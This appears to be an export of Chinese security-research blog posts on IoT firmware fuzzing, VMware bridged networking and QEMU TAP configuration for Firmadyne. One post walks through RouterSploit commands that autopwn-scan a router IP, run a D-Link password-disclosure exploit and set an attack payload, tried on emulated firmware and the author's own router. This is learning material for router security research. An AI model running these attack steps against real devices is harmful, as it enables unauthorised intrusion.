<p><img src="https://pup2y.github.io/2020/04/16/lun-wen-yue-du-bi-ji/%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF.png" alt=""></p>
<p>首先对每个IoT程序进行二进制静态分析获取他们的fuzz keywords。然后构造正常的http或者cgi请求作为初始种子进行Fuzzing。</p>
<p>本文随后与AFL和TriforceAFL进行比较（两者开源），同时为了验证本文的设计提高了效率，将fork引擎的fuzz keywords删除，采用随机变异的方式进行实验。为了让实验更让人信服，对每个实验重复进行5次持续24小时。</p>
<p>实验结果表明确实能够发现已存在的漏洞，以及一个未知漏洞。这验证了实验的有效性。同时表明了TriforceAFL和AFL的缺陷。</p>
<p><img src="https://pup2y.github.io/2020/04/16/lun-wen-yue-du-bi-ji/%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C.png" alt=""></p>
<p>为了证明二进制分析得到的keywords提高了效率，做了以下比较。发现在相同时间内确实能够发现更多的Crash和paths。</p>
<p><img src="https://pup2y.github.io/2020/04/16/lun-wen-yue-du-bi-ji/%E6%9C%89%E6%95%88%E6%80%A7%E9%AA%8C%E8%AF%81.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/04/16/lun-wen-yue-du-bi-ji/path%E5%8F%91%E7%8E%B0%E6%9B%B4%E5%A4%9A.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过对IoT程序进行二进制静态分析得到的keywords确实能够提高模糊测试的效率，同时对TriforceAFL进行相应改进使其适应于IoT程序之后能够更加准确的监控程序运行，从而获取代码覆盖率。</p>
<p>存在的局限性：</p>
<p>1）二进制静态分析：本文定义的Taint sink是uClibc中的字符串和内存比较函数。而有些比较操作可能在二进制文件本身实现，没有调用库函数。还有些厂家使用自己定义的库以及库函数。这些是本文没有考虑到情况。</p>
<p>2）IoT固件仿真：本文的固件仿真是基于Firmadyne进行的，所以CPU架构局限于MIPS小端，MIPS大端和ARM。同时设备类型局限于路由器和摄像头。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>Binary Static Analysis</tag>
        <tag>Greybox Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>VM虚拟机ubuntu16.04的网络桥接配置</title>
    <url>/2020/04/07/ubuntu16-04-de-wang-luo-qiao-jie-pei-zhi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么会记录这个过程，因为昨天想起了路由器有个类似与metasploit的工具<a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">routersploit</a>，之前在ubuntu18.04上装过，好像用了出现问题没跑起来。这次在16.04上安装，并结合firmadyne对其进行测试。对于DIR-815仿真起来之后，routersploit能够扫描到其中的一个洞，但是其他的洞没有payload。然后我用routersploit扫描家里TP-link路由器出现问题了，当时我以为虚拟机用NAT模式，导致在192.168.91.0/24网段，但是路由器地址是192.168.0.1。想着配置虚拟机在192.168.0.0/24网段不就行了。我真是个机灵鬼，结果发现并不是这个问题。不过也学习了一波虚拟机网络配置三种模式。</p>
<h1 id="routersploit"><a href="#routersploit" class="headerlink" title="routersploit"></a>routersploit</h1><p>Exploitation Framework for Embedded Devices，针对嵌入式设备的利用框架。具体里面的架构没有仔细研究，目前只停留在使用阶段。使用界面是一个命令交互式界面。目前最新的版本是3.4.1，里面有132个exploits，32个payloads。当然可以自己扩展。</p>
<p><img src="routersploit.png" alt=""></p>
<p>routersploit的使用步骤在github上的一个演示视频中有演示。总结起来：</p>
<h2 id="扫描目标查找当前漏洞库中存在的漏洞"><a href="#扫描目标查找当前漏洞库中存在的漏洞" class="headerlink" title="扫描目标查找当前漏洞库中存在的漏洞"></a>扫描目标查找当前漏洞库中存在的漏洞</h2><pre class=" language-shell"><code class="language-shell">use scanners/autopwn #选择自动扫描模式
set target 192.168.0.1 #设置目标
run</code></pre>
<p><img src="vulnerablity.png" alt=""></p>
<h2 id="显示目标的漏洞，选择exploit"><a href="#显示目标的漏洞，选择exploit" class="headerlink" title="显示目标的漏洞，选择exploit"></a>显示目标的漏洞，选择exploit</h2><pre class=" language-sh"><code class="language-sh">use exploits/routers/dlink/dir_8xx_password_disclosure #选择exploit
set target 192.168.0.1 #设定目标这里需要重新设置不然show options显示目标为空
check #再次检测目标是否存在该漏洞，若存在会显示[+] Target is vulnerable
run</code></pre>
<p>该exploit是泄漏dir_8xx的默认密码。</p>
<p><img src="password_disclosure.png" alt=""></p>
<p>本次仿真的目标是D-LINK DIR-859路由器。</p>
<p><img src="DIR859.png" alt=""></p>
<p>不需要密码就能登陆。</p>
<p><img src="login.png" alt=""></p>
<h2 id="选择攻击载荷"><a href="#选择攻击载荷" class="headerlink" title="选择攻击载荷"></a>选择攻击载荷</h2><pre class=" language-shell"><code class="language-shell">show payloads
set payload xxxx
set lhost 本机ip
run</code></pre>
<p><img src="show_payloads.png" alt=""></p>
<p>但是会在选择攻击载荷的时候会遇到没有Payload的情况，可以自己编写扩展进去。或者根本就利用不起来，下面的情况就是利用不起来。</p>
<h1 id="测试家用实体路由器遇到的问题"><a href="#测试家用实体路由器遇到的问题" class="headerlink" title="测试家用实体路由器遇到的问题"></a>测试家用实体路由器遇到的问题</h1><p>利用routersploit测试TP-Link TL-WR886N型号实体路由器时（web服务器访问地址也是192.168.0.1）</p>
<p><img src="TL-WR886N.png" alt=""></p>
<p>扫描出存在漏洞，但是无法利用。</p>
<p><img src="set_payload.png" alt=""></p>
<p>github该项目上同样有许多人提出这个<a href="https://github.com/threat9/routersploit/issues/550" target="_blank" rel="noopener">issue</a>(Could not set up HTTP server on lhost / can’t transfer payload)。</p>
<p>我想着是哪里出了问题，之前ubuntu虚拟机的ip是利用NAT模式设置的网络，所以IP是192.168.91.0/24网段的，我以为是IP不在一个网段导致的，所以就想着改下IP。就学习了VM虚拟机配置网络的3种方式。以下内容参考<a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">Vmware虚拟机三种网络模式详解</a></p>
<h1 id="VMware-三种网络工作模式"><a href="#VMware-三种网络工作模式" class="headerlink" title="VMware 三种网络工作模式"></a>VMware 三种网络工作模式</h1><p>vmware为我们提供了三种网络工作模式，它们分别是：<strong>Bridged（桥接模式）</strong>、<strong>NAT（网络地址转换模式）</strong>、<strong>Host-Only（仅主机模式）</strong>。 </p>
<p>打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式）。其实看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。 </p>
<p><img src="%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E7%BC%96%E8%BE%91%E5%99%A8.png" alt=""></p>
<p>同时，在主机上对应的有VMware Network Adapter VMnet1和VMware Network Adapter VMnet8两块虚拟网卡，它们分别作用于仅主机模式与NAT模式下。在“网络连接”中我们可以看到这两块虚拟网卡，如果将这两块卸载了，可以在vmware的“编辑”下的“虚拟网络编辑器”中点击“还原默认设置”，可重新将虚拟网卡还原。 </p>
<p><img src="%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E7%BD%91%E5%8D%A1.png" alt=""></p>
<h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。其网络结构如下图所示： </p>
<p><img src="%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt=""></p>
<h3 id="设置桥接模式"><a href="#设置桥接模式" class="headerlink" title="设置桥接模式"></a>设置桥接模式</h3><ol>
<li><p>在物理机上：网络共享中心-&gt;本地连接-&gt;属性-&gt;勾选桥接模式协议 </p>
<p><img src="%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%E5%8D%8F%E8%AE%AE.png" alt=""></p>
</li>
<li><p>在Vmware上 虚拟机-&gt;设置-&gt;网络适配器-&gt;勾选桥接模式 </p>
<p><img src="%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt=""></p>
</li>
<li><p>Vmware 编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;选中桥接模式</p>
<p><img src="%E9%80%89%E6%8B%A9%E7%BD%91%E5%8D%A11.png" alt=""></p>
<p>（选择好桥接的网卡，我之前选择的自动导致网络无法连接）</p>
<p><img src="%E9%80%89%E6%8B%A9%E7%BD%91%E5%8D%A1.png" alt=""></p>
</li>
<li><p>进入虚拟机更改网卡配置</p>
<p>物理机IP信息（这张图是别人的图不是我自己的图）</p>
<p><img src="%E7%89%A9%E7%90%86%E6%9C%BAIP%E4%BF%A1%E6%81%AF.png" alt=""></p>
<ul>
<li><p>更改IP</p>
<p><code>sudo vim /etc/network/interfaces</code><strong>注意这个ip的网段（子网）要跟你的物理机是一样的。</strong> （下面的图也是比人的图，可能跟上面那张图不匹配，但是意思没错）</p>
<p><img src="interface.png" alt=""></p>
</li>
<li><p>设置DNS文件</p>
<p><code>sudo vim /etc/resolv.conf</code><strong>DNS服务器一定要一样</strong></p>
<p><img src="DNS%E9%85%8D%E7%BD%AE.png" alt=""></p>
</li>
<li><p>重启网络</p>
<p><code>sudo /etc/init.d/networking restart</code></p>
<p>ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 试试能否成功！</p>
</li>
</ul>
</li>
</ol>
<h2 id="NAT-网络地址转换"><a href="#NAT-网络地址转换" class="headerlink" title="NAT(网络地址转换)"></a>NAT(网络地址转换)</h2><p>如果你的网络ip资源紧缺，但是又希望虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示： </p>
<p><img src="NAT%E6%A8%A1%E5%BC%8F.png" alt=""></p>
<p>在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。此时主机如果卸载掉VMnet8，虚拟机也能连上外网，但是虚拟机无法跟主机通信。*<em>VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。 *</em></p>
<p>而且使用NAT模式时，虚拟机能够访问在同一片局域网（连接同一个路由器）中的其他主机，但是其他主机无法访问虚拟机。像下图（2011年一个博主发的，理解上有点偏差），用这图的意思就是想说，使用Vmnet8虚拟交换机，此时虚拟机可以通过主机访问其他主机，其他主机不能访问虚拟机。其网络拓扑如图2所示，使用NAT方式，A1，A2可以访问B，但B不可以访问A1，A2。但A，A1，A2可以互访。</p>
<p><img src="NAT%E6%A8%A1%E5%BC%8F2.png" alt=""></p>
<h2 id="Host-Only（仅主机模式）"><a href="#Host-Only（仅主机模式）" class="headerlink" title="Host-Only（仅主机模式）"></a>Host-Only（仅主机模式）</h2><p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示： </p>
<p><img src="%E4%BB%85%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F1.png" alt=""></p>
<p> 通过上图，可以发现，如果要使得虚拟机能联网，可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。 具体配置可以参考<a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">这篇文章</a></p>
<p>我个人应该不会设置成仅主机模式之后用它来连外网。</p>
<p>最终我将我的一个ubuntu16.04虚拟机配置成桥接模式，让其能够跟统一个局域网中的其他主机互访，让后用routersploit测试还是出现之前的问题。</p>
<p><img src="%E6%B5%8B%E8%AF%95%E5%A4%B1%E8%B4%A5.png" alt=""></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p> <a href="https://blog.csdn.net/shuxiao9058/article/details/7051463" target="_blank" rel="noopener">https://blog.csdn.net/shuxiao9058/article/details/7051463</a> </p>
<p> <a href="https://blog.csdn.net/dif90304/article/details/101758657?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">Vmware虚拟机三种网络模式详解</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
  </entry>
  <entry>
    <title>Linux以及qemu网络配置的学习</title>
    <url>/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/</url>
    <content><![CDATA[<p>最近一直在使用firmadyne仿真固件，因为firmadyne主要还是利用qemu的系统模式加载预先编译好的Linux内核将固件文件系统托起，从而模拟Linux系统的嵌入式设备的运行。在firmadyne推断网络配置之后生成run.sh文件。其中有关配置网卡部分，以便qemu与宿主机进行通信。在复现CVE进行仿真的时候会出现尽管配置好网卡但是无法通信的问题，所以对Linux以及Qemu的网络通信配置进行学习。</p>
<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>QEMU中的网络，包含两部分的内容：</p>
<ol>
<li>客户机使用的虚拟网络设备,也就是客户机看到的仿真硬件，也叫作NIC。常见的有e1000 网卡，rt8139网卡，和virtio-net设备。这些统称为网络前端。</li>
<li>和上述虚拟设备通信的网络后端，这些后端负责把虚拟设备的数据包发到宿主机的网络中。既QEMU用来跟host上外部网络交换数据的东西。最常见的后端是“user”，用来提供NAT的主机网络访问。tap后端，可以让guest直接访问主机的网络。还有socket类型的后端，用来连接多个QEMU实例，来仿真一个共享网络。</li>
</ol>
<p>要创建一个网络后端，可以指定如下选项：</p>
<pre><code># TYPE为后端类型：user、tap、bridge、socket、vde等
# id为一个标识符，将虚拟网络设备和网络后端关联在一起
# 如果客户机有多个虚拟网络设备，则每一个都需要自己的网络后端
-netdev TYPE,id=NAME,...</code></pre><ul>
<li>-net选项可以定义前端和后端；</li>
<li>-netdev选项只能定义后端；</li>
<li>-nic可以一条命令定义前端和后端；</li>
</ul>
<h2 id="net选项"><a href="#net选项" class="headerlink" title="-net选项"></a>-net选项</h2><p>QEMU最初的guest网络配置方式是-net选项。可以通过-net nic,model=xyz,…来配置guest NIC，然后通过-net <backend>,…来配置host 后端（例如：-net user）。但是呢，仿真的NIC和host的后端并不是直接相连的。他们通过一个相同的仿真hub连在一起，这个组件在以前的QEMU里面叫做vlan。以<code>-net nic,model=e1000 -net user -net nic,model=virtio -net tap</code>为例，启动qemu，他们的连接如下示意图：</backend></p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/v2-92732a5754c899e794152c880940b0e8_720w.jpg" alt=""></p>
<p>这意味着，e1000网卡可以看到其他三个的网络流量。这种方式并不是用户期待的。用户更期望的是看到两个独立的guest网络，以及两个独立的host 后端，他们一一对应。为了达到这个目的，你不得不告诉QEMU，我要使用两个单独的hub。通过vlan参数可以指定不同的vlan。例如：<code>-net nic,model=e1000,vlan=0 -net user,vlan=0 -net nic,model=virtio,vlan=1 -net tap,vlan=1</code>。这样，virtio NIC和tap 后端就连到了第二个hub了。</p>
<p>注意，“vlan”参数将在QEMU 3.0版本被移除。因为这个vlan术语跟现在常用的网络中的vlan不是一个概念，会带来很多误解。-net选项依然是保留的。-net可以分别配置前端和后端，可以做到一对一，或者多对一。例如：<code>-net nic,model=e1000 -net nic,model=virtio -net l2tpv3</code></p>
<h2 id="更现代的-netdev选项"><a href="#更现代的-netdev选项" class="headerlink" title="更现代的-netdev选项"></a>更现代的-netdev选项</h2><p>上面提到的-net配置前后端，他们中间必须有一个hub相连。有了这个hub，vhost 就没法在virtio 上启用。不再需要vlan来指定对应的设备能够互相通信，通过id的形式达到一对一的目的。</p>
<p>为了配置guest NIC和后端直接相连的网络，需要使用-netdev和-device搭配使用。例如，需要配置同-net一样的网络，使用-netdev和-device的方式如下：</p>
<p><code>-netdev user,id=n1 -device e1000,netdev=n1 -netdev tap,id=n2 -device virtio-net,netdev=n2</code>.</p>
<p>他们的连接方式是一对一的直接连接，如下图所示：</p>
<p><img src="https://pup2y.github.io/2020/04/02/linux-yi-ji-qemu-wang-luo-pei-zhi-de-xue-xi/v2-82ed3e383d41c406471838a2cdd3056a_720w.jpg" alt=""></p>
<p>-netdev/-device存在以下两个弊端：</p>
<ul>
<li>使用麻烦，在某些场景下不如-net方便。例如创建默认的tap网络，可以使用定义好的/etc/qemu-ifup和/etc/qemu-ifdown脚本。例如，可以简单的使用-net nic -net tap。如果使用-netdev/-device，命令就很长了，还不得不取一个id：<code>-netdev tap,id=n1 -device e1000,netdev=n1</code>.</li>
<li>板载的NIC不能配置成-netdev/-device。</li>
</ul>
<h2 id="新的-nic选项"><a href="#新的-nic选项" class="headerlink" title="新的-nic选项"></a>新的-nic选项</h2><p>上面的两种方式都有各自的局限，新的nic选项，有以下优势：</p>
<ul>
<li>比netdev容易使用。netdev命令太长：-netdev <backend>,id=<id> -device <dev>,netdev=<id></id></dev></id></backend></li>
<li>可以配置板载或者可插拔的NIC；</li>
<li>NIC和host后端直接相连；</li>
<li>可以一条命令配置NIC和host 后端；</li>
</ul>
<p>例如： -netdev tap,id=n1 -device e1000,netdev=n1可以替换成： -nic tap,model=e1000。model参数还可以被省略。这个也比<code>-net nic -net tap</code>方便。 可以用过qemu-system-x86_64 -nic model=help来查看支持的model列表。</p>
<h1 id="QEME支持多种网络后端与外部网络通信"><a href="#QEME支持多种网络后端与外部网络通信" class="headerlink" title="QEME支持多种网络后端与外部网络通信"></a>QEME支持多种网络后端与外部网络通信</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>为了使虚拟机能够与外界通信，Qemu需要为虚拟机提供网络设备。命令行上用-net nic为虚拟机创建虚拟机网卡。例如，qemu的命令行选项<code>-net nic,model=pcnet</code> 表示为虚拟机添加一块pcnet型的以太网卡。如果省略model参数则qemu会默认选择一种 e1000 网卡类型。</p>
<p>有了虚拟网络设备，下面的问题是如何用这些设备来联网。每个qemu的运行实例是宿主机中的一个进程，而每个这样的进程中可以虚拟一些VLAN，虚拟机网络设备接入这些VLAN中。当某个VLAN上连接的网络设备发送数据帧，与它在同一个VLAN中的其它网路设备都能接收到数据帧。上面的例子中对虚拟机的pcnet网卡没有指定其连接的VLAN号，那么qemu默认会将该网卡连入vlan0。下面这个例子更具一般性：</p>
<p><code>-net nic,model=pcnet -net nic,model=rtl8139,vlan=1, -net nic,model=ne2k_pci,vlan=1</code></p>
<p>该命令为虚拟机创建了三块网卡，其中第一块网卡类型是pcnet，连入vlan0；第二块网卡类型是 rtl8139，第三块网卡类型是ne2k_pci，这两块都连入vlan1，所以第二块网卡与第三块网卡可以互相通信，但它们与第一块网卡不能直接通信。 </p>
<p>各个VLAN通过qemu提供的4种通信方式与外界联网：</p>
<p>使用用户模式的客户机可以连通宿主机及外部网络。用户模式网络完全由QEMU模拟实现整个TCP/IP协议栈，并且使用这个协议栈提供一个虚拟的NAT网络。它不依赖于宿主机上的网络工具组件，如bridge-utils、tunctl、dnsmasq、iptables等，因此也不需要root用户权限。</p>
<ol>
<li><p>User mode stack：使用用户模式的客户机可以连通宿主机及外部网络，外部网络不能主动与虚拟机通信。这种方式<strong>由QEMU实现整个TCP/IP协议栈</strong>，并且使用这个协议栈提供一个<strong>虚拟的NAT网络</strong>。负责在虚拟机VLAN和外部网络之间转发数据。它不依赖于宿主机上的网络工具组件，如bridge-utils、tunctl、dnsmasq、iptables等，因此也不需要root用户权限。当然，用户模式网络的缺陷也是明显的：<strong>因其在QEMU内部实现所有网络协议栈，相对性能较差。</strong> 虚拟机VLAN中的各个网络接口只能置于<strong>10.0.2.0</strong>子网中，此外，可以用<code>-redir</code>选项为宿主机和虚拟机的两个TCP或UDP端口建立映射，实现宿主机和虚拟机在特殊要求下的通信（例如X-server或ssh）。<strong>这种方式实现虚拟机上网很简单，类似vmware里的nat,qemu启动时加入-net user选项，虚拟机里使用dhcp方式， (如果没有指定<code>-net xx</code>这是默认配置)。**</strong>如果没有指定网络选项，QEMU默认会模拟单张Intel e1000 PCI网卡，该网卡基于user后端（SLIRP）连接到宿主机**</p>
<pre><code># 不指定网络
qemu 
# 等价配置。自0.12开始废弃的配置方式 -net nic相当于-device DEVNAME；-net TYPE相当于-netdev TYPE
qemu -hda disk.img -net nic -net user
# 等价配置。-netdev指定网络后端，-device指定虚拟网络设备，后者通过netdev字段引用后端的ID
qemu -netdev user,id=network0 -device e1000,netdev=network0</code></pre></li>
<li><p>socket：这种方式又分为TCP和UDP两种类型。<br>（1）TCP：为一个VLAN创建一个套接字，让该套接字在指定的TCP端口上监听，而其他VLAN连接到该套接字上，从而将多个VLAN连接起来。缺点在于<strong>如果监听套接字所在qemu进程崩溃，整个连接就无法工作</strong>。监听套接字所在VLAN通过<code>-net socket,listen</code>选项启用，其他VLAN通过<code>-net socket,connect</code>选项启用。<br>（2）UDP：所有VLAN连接到一个多播套接字上，从而使多个VLAN通过一个总线通信。所有VLAN都通过<code>-net socket,mcast</code>选项启用。</p>
<p>通过参数<code>-netdev socket</code> (或<code>-nic socket</code>或<code>-net socket</code>) 可以实现多个虚拟机之间的互联。 </p>
</li>
<li><p>TAP：这种方式要比user mode复杂一些，但是设置好后 虚拟机&lt;–&gt;互联网 虚拟机&lt;–&gt;主机 通信都很容易，类似vmware的host-only,qemu使用tun/tap设备在主机上增加一块虚拟网络设备(tun0),然后就可以象真实网卡一样配置它。</p>
<p>这种方式首先需要在宿主机中创建并配置<strong>一个TAP设备</strong>，TAP被用于创建一个网桥，而TUN与路由相关，桥接就是把一台机器上的若干个网络接口“连接”起来。其结果是，其中一个网口收到的报文会被复制给其他网口并发送出去。以使得网口之间的报文能够互相转发。局域网内可以通过ssh登陆虚拟机。</p>
<p>qemu进程将该TAP设备连接到虚拟机VLAN中。其次，为了实现虚拟机与外部网络的通信，在宿主机中通常还要<strong>创建并配置一个网桥</strong>，并将宿主机的网络接口（通常是eth0）作为<strong>该网桥的一个接口</strong>。最后，只要将<strong>TAP设备作为网桥的另一个接口</strong>，虚拟机VLAN<strong>通过TAP设备</strong>就可以与外部网络完全通信了。这是因为，宿主机的eth0接口作为网桥的接口，与外部网络连接；TAP设备作为网桥的另一个接口，与虚拟机VLAN连接，这样两个网络就连通了。此时，网桥在这两个网络之间转发数据帧。<br>这里有两个问题需要注意：<br>（1）网桥的转发工作需要得到内核的支持，所以在编译宿主机内核时需要选择与桥接相关的配置选项。<br>（2）<strong>当宿主机eth0接口作为网桥接口时，不能为其配置IP地址，而要将IP地址配置给网桥。</strong><br>TAP方式由<code>-net tap</code>选项启用。</p>
</li>
<li><p>VDE：这种方式首先要启动一个VDE进程，该进程打开一个TAP设备，然后各个虚拟机VLAN与VDE进程连接，这样各个VLAN就可以通过TAP设备连接起来。VDE进程通过执行<code>vde_switch</code>命令启动，各个VLAN所在qemu进程通过执行<code>veqe</code>命令启动，这些VLAN就可以与VDE进程连接了。</p>
<p>以上四种通信方式中，socket方式和VDE方式用于虚拟机VLAN之间的连接，而user mode stack方式与外部网路的通信比较有限，<strong>Firmadyne中也是利用TAP方式配置qemu网络</strong>，所以下面主要讨论TAP方式的配置。 </p>
</li>
</ol>
<h2 id="qemu网络配置（TAP方式）"><a href="#qemu网络配置（TAP方式）" class="headerlink" title="qemu网络配置（TAP方式）"></a>qemu网络配置（TAP方式）</h2><p>参照 <a href="https://zh.wikipedia.org/wiki/TUN与TAP" target="_blank" rel="noopener">wiki</a> 对TAP/TUN介绍。<strong>TUN/TAP是操作系统内核支持的网络虚拟设备</strong>，这种网络设备完全由的软件实现。与网络硬件设备不同，TUN/TAP负责<strong>在内核协议栈与用户进程之间传送协议数据单元</strong>。TUN与TAP的区别在于，TUN工作在网络层，而TAP则工作在数据链路层。具体在运行TCP/IP的以太网中，TUN与应用程序交换IP包，而TAP与应用程序交换以太帧。所以TUN通常涉及路由，而TAP则常用于网络桥接。TUN/TAP的典型应用包括：虚拟私有网络OpenVPN、OpenSSH 以及虚拟机器QEMU、KVM。 </p>
<h3 id="具体配置过程"><a href="#具体配置过程" class="headerlink" title="具体配置过程"></a>具体配置过程</h3><ol>
<li><p>首先确定你的机器支持 TAP/TUN 虚拟设备</p>
</li>
<li><p>安装两个配置网络所需软件包： </p>
<pre class=" language-sh"><code class="language-sh">apt-get install bridge-utils        # 虚拟网桥工具
apt-get install uml-utilities       # UML（User-mode linux）工具</code></pre>
</li>
<li><p>配置虚拟网桥的操作（假设系统启动后eth0已经启动，并且从DHCP获得IP地址）</p>
<p>一次性操作，每次重启失效。最好写一个脚本，重启之后可以批处理。</p>
<pre class=" language-sh"><code class="language-sh">#相关指令整理
ifconfig <你的网卡名称(能上网的那张)> down    # 首先关闭宿主机网卡接口
brctl addbr br0                     # 添加一座名为 br0 的网桥
brctl addif br0 <你的网卡名称>        # 在 br0 中添加一个接口
brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议
brctl setfd br0 1                   # 设置 br0 的转发延迟
brctl sethello br0 1                # 设置 br0 的 hello 时间
ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口
ifconfig <你的网卡名称> 0.0.0.0 promisc up    # 启用网卡接口，作为网桥的一端
dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址
brctl show br0                      # 查看虚拟网桥列表
brctl showstp br0                   # 查看 br0 的各接口信息

#在没有dhcp服务器的网络中也可以用ifconfig命令为br0接口配置一个静态IP地址：
ifconfig br0 192.168.0.22 netmask 255.255.255.0
route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.0.254</code></pre>
<p>永久性操作，启动时自动配置。</p>
<p>在之前的文章<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>有提到在 /etc/network/interfaces 文件中配置网桥br0。</p>
<pre class=" language-sh"><code class="language-sh">auto lo # linux中的回环网卡
iface lo inet loopback
auto ens33 # ubuntu16.04上网网卡
iface ens33 inet manual #其实可以设置为dhcp启动不影响
up ifconfig ens33 0.0.0.0 up
auto br0 #增加网桥
iface br0 inet dhcp #网桥的IP地址从dhcp服务器获得
  bridge_ports ens33 #网桥
  bridge_maxwait 0</code></pre>
</li>
<li><p>配置TAP设备作为网桥br0的另一端的操作：</p>
<p>可以把一下命令也写/etc/network/interfaces文件中。 </p>
<pre class=" language-sh"><code class="language-sh">tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问
brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口
ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口
brctl showstp br0                   # 显示 br0 的各个接口</code></pre>
<p>也可以在/etc/qemu-ifup（qemu启动时会运行的文件）中添加命令：</p>
<pre class=" language-sh"><code class="language-sh">#! /bin/sh
echo "Executing /etc/qemu-ifup"
echo "bridge networking"
echo "Bringing up $1 for bridge mode" #$1一般指tap0
sudo /sbin/ifconfig $1 0.0.0.0 promisc up #启用tap0接口
echo "Adding $1 to br0"
sudo /sbin/brctl addif br0 $1 #在网桥中增加tap0接口
sleep 3</code></pre>
</li>
<li><p>利用qemu系统模式启动镜像，指定网络连接模式是 TAP 即可。 </p>
<pre class=" language-sh"><code class="language-sh">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap</code></pre>
<p>参数含义：-net nic 表示希望 QEMU 在虚拟机中创建一张虚拟网卡，-net tap 表示连接类型为 TAP。默认选择tap0以及启动调用脚本 /etc/qemu-ifup。</p>
<pre class=" language-sh"><code class="language-sh">-net tap,ifname=tap0,script=no,downscript=no</code></pre>
